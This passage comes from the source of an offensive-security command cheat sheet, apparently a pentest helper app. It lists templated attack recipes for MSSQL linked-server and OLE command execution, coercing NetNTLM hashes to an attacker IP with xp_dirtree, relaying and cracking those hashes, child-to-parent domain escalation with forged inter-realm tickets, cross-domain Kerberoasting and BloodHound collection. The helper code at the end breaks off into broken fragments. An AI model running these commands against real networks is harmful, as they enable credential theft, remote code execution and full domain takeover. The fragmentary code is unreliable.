 [`SELECT srvname, isremote FROM sysservers;`,'list linked servers'],
 [`EXEC ('select @@version') AT [LINKEDSRV];`,'query through link'],
 [`EXEC ('select system_user') AT [LINKEDSRV];`,'context on linked server'],
 [`EXEC ('EXEC sp_configure ''show advanced options'',1; RECONFIGURE;') AT [LINKEDSRV];`,'enable advanced remotely'],
 [`EXEC ('EXEC xp_cmdshell ''whoami''') AT [LINKEDSRV];`,'RCE on linked server'],
 [`EXEC sp_serveroption 'LINKEDSRV', 'rpc out', 'true';`,'enable RPC out if needed']
],note:'Linked servers often use sysadmin context — this is a common lab path from a low-priv SQL login to DC compromise. Chain with UNC coercion: <span class="mono">EXEC xp_dirtree \'\\\\{{attacker_ip}}\\share\'</span> steals the service account NetNTLM.'});

R({id:'mssql-coerce',cat:'mssql',title:'MSSQL — steal service account NetNTLM',desc:'Force the SQL service to authenticate to you, then crack or relay.',
cmds:[
 [`EXEC master..xp_dirtree '\\\\{{attacker_ip}}\\share';`,'SMB auth trigger (xp_dirtree)'],
 [`sudo responder -I {{iface}} -wdv`,'capture the hash (attacker)','ns'],
 [`impacket-ntlmrelayx -t ldaps://{{dc_host}} --escalate-user '{{user}}' -smb2support`,'or relay it to LDAP(S)','n'],
 [`hashcat -m 5600 /usr/share/responder/logs/NTLMv2-*.txt {{wordlist}}`,'crack NetNTLMv2','n']
],note:'On newer SQL Server, <span class="mono">xp_dirtree</span> outbound SMB may be restricted by the <span class="mono">OUTBOUND_NETWORK</span> policy. Alternatives: <span class="mono">xp_fileexist</span>, <span class="mono">xp_subdirs</span>.'});

R({id:'mssql-alt-rce',cat:'mssql',title:'MSSQL — RCE without xp_cmdshell (OLE / CLR)',desc:'When xp_cmdshell is disabled you can often still execute via OLE Automation or a CLR assembly.',
cmds:[
 [`EXEC sp_configure 'show advanced options', 1; RECONFIGURE;`,'unlock advanced options'],
 [`EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;`,'enable OLE automation'],
 [`DECLARE @o INT; EXEC sp_oacreate 'wscript.shell', @o OUT; EXEC sp_oamethod @o, 'run', NULL, 'cmd /c whoami > C:\\Windows\\Temp\\out.txt';`,'run command via OLE'],
 [`EXEC sp_configure 'clr enabled', 1; RECONFIGURE;`,'enable CLR'],
 [`SELECT name, permission_set_desc FROM sys.assemblies;`,'existing assemblies'],
 [`EXEC sp_configure 'Ole Automation Procedures', 0; RECONFIGURE;`,'CLEANUP: disable OLE']
],note:'OLE output is not returned — redirect to a file and read it (e.g. <span class="mono">BULK INSERT</span> or a second command). CLR needs a compiled assembly (<span class="mono">CREATE ASSEMBLY ... FROM 0x... WITH PERMISSION_SET = UNSAFE</span>) — use prebuilt tooling. A linked server is often the easier pivot (see the linked-servers recipe).'});

/* ===== TRUSTS ===== */
R({id:'trust-enum',cat:'trust',title:'Enumerate domain trusts',desc:'Find parent/child/forest trusts before attacking them.',
cmds:[
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get trusts --transitive`,'trust tree (bloodyAD)'],
 [`nltest /domain_trusts /all_trusts /v`,'from a Windows session','n'],
 [`nltest /trusted_domains`,'quick list of trusted domains','n'],
 [`netdom trust {{domain}} /domain:{{trust_domain}} /verify`,'verify the trust + show direction','n'],
 [`ldapsearch -x -H ldap://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b 'CN=System,{{domain_dn}}' '(objectClass=trustedDomain)' trustPartner,trustDirection,trustAttributes,trustType`,'raw trust attributes'],
 [`Get-ADTrust -Filter *`,'PowerShell (RSAT)','n'],
 [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' -M enum_trusts`,'nxc module (version dependent)']
],note:'<span class="mono">trustDirection</span>: 1 inbound, 2 outbound, 3 bidirectional. <span class="mono">trustAttributes</span>: 0x1 non-transitive, 0x4 quarantine (SID filtering on), 0x8 forest-transitive, 0x20 intra-forest. A parent trust (intra-forest) is where SID-history / extra-sid tickets work by default — see the SID history card. Child DCs also hold the machine-readable trust key.<br>Next steps: cross-domain roasting, SID history, foreign group membership.'});

R({id:'trust-raisechild',cat:'trust',title:'Child → parent: raiseChild / trust key',desc:'From a compromised child domain, escalate to the parent with the inter-realm trust key.',
cmds:[
 [`impacket-raiseChild '{{domain}}/{{user}}:{{password}}'`,'automated child→parent (impacket)'],
 [`impacket-secretsdump -just-dc-user '{{netbios}}$' '{{domain}}/{{user}}:{{password}}@{{dc_host}}' -dc-ip {{dc_ip}}`,'dump trust account key (name = NetBIOS + $)'],
 [`KRB5CCNAME={{ccache}} impacket-secretsdump -k -no-pass -just-dc-user '{{netbios}}$' '{{domain}}/{{user}}@{{dc_fqdn}}'`,'trust key via ccache'],
 [`impacket-ticketer -nthash '{{krbtgt_hash}}' -domain-sid '{{domain_sid}}' -domain {{domain}} -extra-sid '{{extra_sid}}' -spn krbtgt/{{parent_domain}} '{{target_user}}'`,'forge inter-realm golden (extra-sid = parent SID-519)'],
 [`export KRB5CCNAME=$(pwd)/'{{target_user}}.ccache' && nxc smb <PARENT_DC> -u '{{target_user}}' -k --use-kcache --ntds`,'use it against the parent DC']
],note:'<b>Requires Domain Admin (or DCSync rights) in the child domain</b> — the trust key comes from secretsdump, which needs replication rights. Automated route: <span class="mono">raiseChild.py</span> dumps the trust key, forges the ticket and psexecs to the parent DC (force a host with <span class="mono">-target-exec &lt;parent-dc&gt;</span>). Manual route needs: child domain SID, trust key, parent domain SID + <span class="mono">-519</span> (Enterprise Admins RID), and SPN <span class="mono">krbtgt/&lt;parent.fqdn&gt;</span>. Compare with <span class="mono">thehacker.recipes</span> for your exact trust direction.'});

R({id:'trust-cross-domain-roast',cat:'trust',title:'Cross-domain roasting via trust',desc:'Trusts let your credentials be accepted in the other domain — its service accounts and pre-auth-less users are roastable too.',
cmds:[
 [`impacket-GetUserSPNs '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}} -target-domain {{trust_domain}} -request -outputfile {{hashfile}}`,'cross-domain Kerberoast (password)'],
 [`KRB5CCNAME={{ccache}} impacket-GetUserSPNs '{{domain}}/{{user}}' -k -no-pass -dc-ip {{dc_ip}} -target-domain {{trust_domain}} -request -outputfile {{hashfile}}`,'cross-domain Kerberoast (ccache)'],
 [`impacket-GetNPUsers '{{trust_domain}}/' -dc-ip {{trust_dc_ip}} -usersfile users.txt -request -format hashcat -outputfile {{hashfile}}`,'AS-REP against the trusted domain'],
 [`nxc ldap {{trust_domain}} -d {{trust_domain}} -u '{{user}}' -p '{{password}}' --kerberoasting {{hashfile}}`,'nxc via trust credentials'],
 [`nxc ldap {{trust_domain}} -d {{trust_domain}} -u '{{user}}' -p '{{password}}' --asreproast {{hashfile}}`,'nxc AS-REP variant'],
 [`hashcat -m 13100 {{hashfile}} {{wordlist}}`,'crack TGS (no proxy)','n'],
 [`hashcat -m 18200 {{hashfile}} {{wordlist}}`,'crack AS-REP (no proxy)','n']
],note:'<span class="mono">-target-domain</span> makes impacket request a referral ticket for the other domain — your user must be accepted there (intra-forest usually is; forest trusts depend on selective authentication). The trusted DC must be reachable: add <span class="mono">{{trust_dc_ip}} {{trust_domain}}</span> to /etc/hosts if DNS does not resolve it.'});

R({id:'trust-sid-history',cat:'trust',title:'SID history / ExtraSIDs across trusts',desc:'Forge an inter-realm ticket with the trust key and inject extra SIDs (for example Enterprise Admins of the parent) to cross the trust.',
cmds:[
 [`impacket-secretsdump -just-dc '{{domain}}/{{user}}:{{password}}@{{dc_host}}' -dc-ip {{dc_ip}} | grep -i '\\$'`,'list trust accounts (name = trusted NetBIOS + $)'],
 [`impacket-secretsdump -just-dc-user '<TRUST_NETBIOS>$' '{{domain}}/{{user}}:{{password}}@{{dc_host}}' -dc-ip {{dc_ip}}`,'dump the inter-realm trust key'],
 [`impacket-ticketer -nthash '{{krbtgt_hash}}' -domain-sid '{{domain_sid}}' -domain {{domain}} -extra-sid '{{extra_sid}}' -groups 513,512,520,518,519 -spn 'krbtgt/{{trust_domain}}' '{{target_user}}'`,'forge inter-realm golden (extra-sid = trusted SID-519)'],
 [`impacket-ticketer -nthash '{{krbtgt_hash}}' -domain-sid '{{domain_sid}}' -domain {{domain}} -extra-sid '{{extra_sid}}' -extra-pac -spn 'krbtgt/{{trust_domain}}' '{{target_user}}'`,'with extra PAC (newer ticket requirements)'],
 [`export KRB5CCNAME=$(pwd)/'{{target_user}}.ccache' && nxc smb {{trust_domain}} -u '{{target_user}}' -k --use-kcache --ntds`,'use it against the trusted DC'],
 [`impacket-psexec -k -no-pass '{{domain}}/{{target_user}}@{{trust_domain}}'`,'exec via the inter-realm ticket'],
 [`impacket-secretsdump -k -no-pass '{{trust_domain}}'`,'dump with the ticket']
],note:'<b>Requires DCSync / Domain Admin in the child domain</b> to dump the inter-realm trust key. SID filtering decides whether this works: <b>intra-forest</b> child↔parent trusts allow SID history (Quarantine off), while <b>forest trusts</b> strip SIDs that do not belong to the trusted domain (Quarantine on). Check the trust attributes with the trust-enum recipe; labs can disable it with <span class="mono">netdom trust &lt;domain&gt; /domain:&lt;trust&gt; /quarantine:no</span> and <span class="mono">/enablesidhistory:yes</span>. On Windows, mimikatz <span class="mono">kerberos::golden /sids:...</span> does the same.'});

R({id:'trust-foreign-groups',cat:'trust',title:'Foreign group membership',desc:'Users from a trusted domain can be members of your groups (and vice versa) — their own credentials then work against your resources.',
cmds:[
 [`ldapsearch -x -H ldap://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b 'CN=ForeignSecurityPrincipals,{{domain_dn}}' '(objectClass=foreignSecurityPrincipal)' cn,objectSid`,'foreign SIDs present in this domain'],
 [`impacket-lookupsid '{{domain}}/{{user}}:{{password}}@{{trust_dc_ip}}'`,'resolve SIDs against the trusted DC'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get membership '{{user}}'`,'your own (possibly foreign) group memberships'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{group}}' --attr member`,'inspect a group for foreign SIDs'],
 [`nxc smb {{trust_domain}} -d {{trust_domain}} -u '<FOREIGN_USER>' -p '<PASSWORD>'`,'use credentials from the owning domain against this one'],
 [`nxc ldap {{trust_domain}} -d {{trust_domain}} -u '<FOREIGN_USER>' -p '<PASSWORD>' --groups`,'enumerate as the foreign user']
],note:'Two directions: (1) foreign principals nested in <b>your</b> groups are an entry path for credentials from their home domain; (2) your user nested in a foreign group grants you access there. BloodHound shows both via the "Foreign group members (cross-domain)" query in the BloodHound tab. Memberships only translate into access where the resource domain accepts the authenticating user.'});

/* ===== BLOODHOUND COLLECTION ===== */
R({id:'bh-python',cat:'bh',title:'bloodhound-python collection',desc:'Collect from Linux — all the data needed for pathfinding.',
cmds:[
 [`bloodhound-python -u '{{user}}' -p '{{password}}' -d {{domain}} -ns {{dc_ip}} -c All --zip`,'password'],
 [`bloodhound-python -u '{{user}}' --hashes ':{{nthash}}' -d {{domain}} -ns {{dc_ip}} -c All --zip`,'NT hash'],
 [`KRB5CCNAME={{ccache}} bloodhound-python -u '{{user}}' -k -no-pass -d {{domain}} -ns {{dc_ip}} -c All --zip`,'Kerberos ccache'],
 [`bloodhound-ce-python -u '{{user}}' -p '{{password}}' -d {{domain}} -ns {{dc_ip}} -c All --zip`,'BloodHound CE collector (newer package name)'],
 [`bloodhound-python -u '{{user}}' -p '{{password}}' -d {{domain}} -ns {{dc_ip}} -c DCOnly --zip`,'DCOnly (fast, no sessions)']
],note:'<span class="mono">-ns</span> = DNS server (the DC). Add <span class="mono">--dns-tcp</span> if UDP/53 is filtered. Import the generated zip into BloodHound CE via <b>Administration → File Ingest</b>.'});

R({id:'bh-nxc',cat:'bh',title:'NetExec BloodHound collector',desc:'One-shot collection with your nxc context (supports ccache).',
cmds:[
 [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --bloodhound -c All --dns-server {{dc_ip}}`,'password'],
 [`nxc ldap {{dc_host}} -u '{{user}}' -H '{{nthash}}' --bloodhound -c All --dns-server {{dc_ip}}`,'PtH'],
 [`KRB5CCNAME={{ccache}} nxc ldap {{dc_host}} -u '{{user}}' -k --use-kcache --bloodhound -c All --dns-server {{dc_ip}}`,'ccache'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get bloodhound --path loot.zip`,'bloodyAD collector']
],note:'Output zip lands in the current directory. Collection methods: <span class="mono">All</span>, <span class="mono">Group</span>, <span class="mono">Session</span>, <span class="mono">Trusts</span>, <span class="mono">ACL</span>, <span class="mono">ObjectProps</span>, <span class="mono">DCOnly</span>.'});

function toolKey(tpl){
  let t = String(tpl).trim();
  if(!t || t[0] === '#' || t.indexOf('export ') === 0 || t.indexOf('echo ') === 0) return '';
  t = t.replace(/^(?:[A-Z_][A-Z0-9_]*=[^\s]+\s+)+/, '');
  t = t.replace(/^(?:(?:sudo|proxychains4?)\s+)+/, '');
  const parts = t.split(/\s+/);
  const first = (parts[0] || '').replace(/^\.\//, '');
  const second = parts[1] || '';
  if(HELP_TOOL[first]) return first;
  if(second && HELP_TOOL[first + ' ' + second]) return first + ' ' + second;
  if(/^python3?$/.test(first) && second){
    if(second === '-m' && parts[2]) return parts[2];
    const base = second.split('/').pop();
    if(HELP_TOOL[base]) return base;
  }
  for(const raw of parts){
    const tok = raw.replace(/^["'(\[]+/, '').replace(/["'),;\]|]+$/, '');
    const base = tok.split(/[\/\\]/).pop();
    if(base && HELP_TOOL[base]) return base;
  }
  return '';
}

  });
}

  return { used, unused: Object.keys(HELP_TOOL).filter(k => !used[k]) };
}

function zshEmit(data){
  const names = Object.keys(data).sort((a, b) => a.toLowerCase() < b.toLowerCase() ? -1 : 1);
  const fnName = n => '_hk_' + n.replace(/[^A-Za-z0-9_]/g, '_');
  const q = s => "'" + String(s).replace(/'/g, "'\\''") + "'";
  let out = '#compdef ' + names.join(' ') + '\n';
  out += '# Hackerman v1.7.0 — generated from index.html. Regenerate: "zsh" button in the header or tools/gen-zsh-completions.mjs\n\n';
  out += '_hackerman() {\n  local tool=${words[1]:t}\n  case $tool in\n';
  names.forEach(n => { out += '    ' + n + ') ' + fnName(n) + ' ;;\n'; });
  out += '  esac\n}\n\n';
  names.forEach(n => {
    const d = data[n];
    const flags = [...d.flags].filter(f => !(f === '-M' && d.modules.size) && !(f === '-m' && d.modes.size)).sort();
    out += fnName(n) + '() {\n';
    if(d.subs.size){
      out += '  local -a subs\n  subs=(' + [...d.subs].sort().join(' ') + ')\n';
      out += '  if (( CURRENT == 2 )); then _describe ' + q('subcommand') + ' subs; return; fi\n';
    }
    if(n === 'xfreerdp3'){
      out += '  local -a o\n  o=(' + flags.map(q).join(' ') + ')\n  compadd -a o\n';
    } else {
      out += '  local -a flags\n  flags=(' + flags.map(q).join(' ') + ')\n';
      const specs = [];
      if(d.modules.size) specs.push('-M[module]:module:(' + [...d.modules].sort().join(' ') + ')');
      if(d.modes.size) specs.push('-m[mode]:mode:(' + [...d.modes].sort((a, b) => Number(a) - Number(b)).join(' ') + ')');
      out += '  _arguments -s $flags' + (specs.length ? ' ' + specs.map(q).join(' ') : '') + '\n';
    }

  return out;
}

function applyReqs(){

  if(step.req) return step.req;
  const seen = [];
  (step.r || []).forEach(id => {

    (r.reqs || []).forEach(t => { if(['creds','nocreds','artifact'].indexOf(t) < 0 && seen.indexOf(t) < 0) seen.push(t); });
